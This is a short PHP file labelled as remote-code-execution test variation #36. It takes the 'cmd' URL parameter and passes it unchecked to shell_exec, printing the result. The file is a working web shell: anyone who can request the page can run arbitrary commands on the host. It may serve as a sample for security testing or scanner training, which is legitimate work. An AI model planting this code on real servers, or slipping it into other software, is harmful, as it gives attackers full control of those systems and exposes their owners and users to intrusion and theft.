<?php
// RCE test variation #36
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>